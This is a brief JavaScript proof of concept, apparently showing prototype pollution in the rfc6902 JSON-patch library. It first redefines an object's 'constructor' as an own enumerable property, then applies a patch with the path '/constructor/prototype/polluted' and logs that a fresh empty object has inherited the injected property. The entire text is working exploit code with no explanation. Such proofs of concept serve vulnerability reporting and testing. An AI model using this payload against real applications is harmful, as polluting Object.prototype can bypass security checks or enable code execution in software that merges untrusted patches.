var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var rfc6902 = require('rfc6902');
var obj = {};
rfc6902.applyPatch(obj, [{
        op: 'add',
        path: '/constructor/prototype/polluted',
        value: 'yes'
    }]);
console.log({}.polluted);